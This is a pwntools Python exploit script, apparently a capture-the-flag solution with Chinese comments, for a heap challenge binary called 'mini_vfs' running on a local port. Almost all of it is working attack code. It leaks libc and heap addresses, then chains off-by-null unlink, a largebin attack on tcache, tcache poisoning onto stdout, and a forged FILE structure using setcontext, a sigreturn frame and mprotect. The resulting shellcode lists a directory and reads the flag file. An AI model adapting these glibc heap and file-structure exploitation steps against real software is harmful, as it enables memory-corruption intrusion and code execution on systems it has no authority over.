from pwn import *
r = process("./mini_vfs")
r = remote("127.0.0.1",10000)
elf = ELF("./mini_vfs")
libc = ELF("/home/ubuntu/worktools/glibc-all-in-one/libs/2.41-6ubuntu1.2_amd64/libc.so.6")
context(arch="amd64",os="linux",log_level="debug")
context.terminal = ['terminator','-x','sh','-c']


def dbg(src):
    gdb.attach(r,src)
    pause()

def send_payload(payload):
    r.sendlineafter("vfs> ",payload)

def touch(path, size, token):
    payload = 'touch ' + path + " " + str(size) + " " + str(token)
    send_payload(payload)

def rm(path, token):
    payload = 'rm ' + path + " " + str(token)
    send_payload(payload)

def cat(path, token):
    payload = 'cat ' + path + " " + str(token)
    send_payload(payload)

def write(path, len, token):
    payload = 'write ' + path + " " + str(len) + " " + str(token)
    send_payload(payload)

'''
J -> 0 0x2f417635
Y -> 1 0x7902bb64
R -> 2 0x96bf2a87
B -> 3 0x9e426406
A -> 4 0x48f81d21
C -> 5 0x5f66b70
L -> 6 0x5dd06dc3
K -> 7 0xccf4902
X -> 8 0xe8b663ad
Q -> 9 0x1aeea2ac
U -> 10 0x14673e2f
a -> 11 0xc9eb924e
f -> 12 0xd6f28bb9
e -> 13 0x94ba62f8
Z -> 14 0x74aa33cb
h -> 15 0x8f3f914a
'''

src = '''
b *$rebase(0x187C)
b printf
b *__vfprintf_internal+598
b *__printf_buffer_to_file_done+213
b *_IO_wfile_seekoff+108
b *_IO_switch_to_wget_mode+45
'''

# r = gdb.debug("./mini_vfs",src)

# dbg(src)
#首先申请4个堆块用于地址泄漏
touch('J', 0x500, 0x2f417635)
touch('Y', 0x500, 0x7902bb64)
touch('R', 0x500, 0x96bf2a87)
touch('B', 0x500, 0x9e426406)

#释放掉两个堆块使其进入unstored bin中
rm('J', 0x2f417635)
rm('R', 0x96bf2a87)

# #将两个堆块申请回来，由于缺少初始化操作，此时堆块上残留libc和堆地址
touch('J', 0x420, 0x2f417635)
touch('R', 0x420, 0x96bf2a87)
cat('J', 0x2f417635)
libc_base = u64(r.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00")) - 0x210f50
success("libc_base = "+hex(libc_base))

tcache_bin = libc_base+0x2101e8
IO_2_1_stdout = libc_base+libc.symbols['_IO_2_1_stdout_']
IO_2_1_stdin = libc_base+libc.symbols['_IO_2_1_stdin_']
setcontext = libc_base+libc.symbols['setcontext'] + 61

r.recv(2)
heap_base = u64(r.recv(6).ljust(8,b"\x00")) - 0x290
success("heap_base = "+hex(heap_base))

#泄漏地址后将堆块全部释放掉，初始化堆布局，准备进行堆风水
rm('J', 0x2f417635)
rm('Y', 0x7902bb64)
rm('R', 0x96bf2a87)
rm('B', 0x9e426406)

#准备好四个堆块进行off by null攻击
touch('J', 0x4f8, 0x2f417635)
touch('Y', 0x428, 0x7902bb64)
touch('R', 0x4f8, 0x96bf2a87)
touch('B', 0x418, 0x9e426406)

# dbg(src)
#伪造fake size和fd、bk指针用于绕过unlink检查
base_addr = heap_base + 0x2f0
fd = base_addr - 0x18
bk = base_addr - 0x10
base = heap_base + 0x2c0
payload = p64(0)*5+p64(0x901)+p64(fd)+p64(bk)+p64(0)*2+p64(base)
write('J', 0x60, 0x2f417635)
r.sendafter("> ",payload)
# edit(0,0x60,payload)

#进行unlink攻击
rm('J', 0x2f417635)
write('Y', 0x428, 0x7902bb64)
r.sendafter("> ", b'a'*0x420+p64(0x900))
rm('R', 0x96bf2a87)

# delete(0)
# edit(1,0x428,b'a'*0x420+p64(0x900))
# delete(2)

#重新申请堆块，此时chunks中存在1、4两个相同的指针指向同一个堆块
touch('J', 0x4f8, 0x2f417635)
touch('R', 0x4c0, 0x96bf2a87)
touch('A', 0x428, 0x48f81d21)
touch('C', 0x4f8, 0x5f66b70)

#进行largebin attack攻击
#首先释放较大的堆块使其进入largebin
rm('Y', 0x7902bb64)
touch('L', 0x500, 0x5dd06dc3)

#然后释放较小的堆块使其进入unstored bin
rm('B', 0x9e426406)

# # dbg(src)
#利用构造好的指针修改释放掉的largebin中对块的bk_nextsize,攻击目标为tcache_bin
payload = p64(0)*3+p64(tcache_bin-0x20)
write("A", 0x20, 0x48f81d21)
r.sendafter("> ", payload)

#申请一个较大的堆块使得unstored bin中堆块进入largebin，触发largebin attack
touch('K', 0x500, 0xccf4902)

# 申请一个大小为0x4c0的堆块
touch('Y', 0x4c0, 0x7902bb64)

# 将两个堆块释放进入tcache bin中
rm('Y', 0x7902bb64)
rm('R', 0x96bf2a87)

# 利用heap_overlapping修改tcache bin的fd指针为IO_2_1_stdout
payload = p64(0)*5+p64(0x4d1)+p64(IO_2_1_stdout ^ (heap_base >> 12))
write('J', 0x40, 0x2f417635)
r.sendafter("> ",payload)

# 将IO_2_1_stdout地址申请出来
touch('Y', 0x4c0, 0x7902bb64)
touch('R', 0x4c0, 0x96bf2a87)


code = shellcraft.open("/")
code += shellcraft.getdents64('rax', heap_base, 0x200)
code += shellcraft.write(1,heap_base, 0x200)
code += shellcraft.read(0,'rsp',0x200)
shellcode=asm(code)

frame = SigreturnFrame()
frame.rsp = libc_base+0x2118c0
frame.rdi = (IO_2_1_stdout >> 16) << 16
frame.rsi = 0x10000
frame.rdx = 7
frame.rip = libc_base+libc.symbols['mprotect']

fake_io_addr=IO_2_1_stdout # 伪造的fake_IO结构体的地址,rdi参数地址

fake_IO_FILE = p64(0)*9
fake_IO_FILE += p64(1) # 调用_IO_wfile_seekoff的mode值,保证不为0
fake_IO_FILE += p64(fake_io_addr+0x118)# rdx = _wide_data->_IO_write_ptr
fake_IO_FILE += p64(setcontext) # _wide_data vtable中调用的函数地址,劫持位置改为call addr
fake_IO_FILE = fake_IO_FILE.ljust(0x88, b'\x00')
fake_IO_FILE += p64(heap_base)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, b'\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data指针,这里构造_wide_data结构体指向FILE结构体的_IO_write_end
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, b'\x00')
fake_IO_FILE += p64(libc_base+0x20f1d8)  # FILE vtable + 0x38 = _IO_wfile_jumps中__GI__IO_wfile_seekoff指针
fake_IO_FILE += p64(0)+p64(IO_2_1_stdout)+p64(IO_2_1_stdin)+p64(0)*3
fake_IO_FILE += p64(fake_io_addr+0x40)  # _wide_data vtable虚表指针

payload = fake_IO_FILE

payload+=bytes(frame)
payload=payload.ljust(0x300,b'\x00')
payload+=p64(libc_base+0x2118c8)
payload+=shellcode

# 修改IO_2_1_stdout的内容
write('R', 0x400, 0x96bf2a87)
r.sendafter("> ", payload)

r.recvuntil("flag_")
flag_name = (b'flag_'+r.recvuntil("\x00")[:-1]).decode('utf-8')
success("flag_name = " + flag_name)

code = shellcraft.open("/"+flag_name)
code += shellcraft.read('rax',heap_base,0x50)
code += shellcraft.write(1,heap_base, 0x50)
shellcode=asm(code)

payload = p8(0x90)*0x100 + shellcode
r.send(payload)

r.interactive()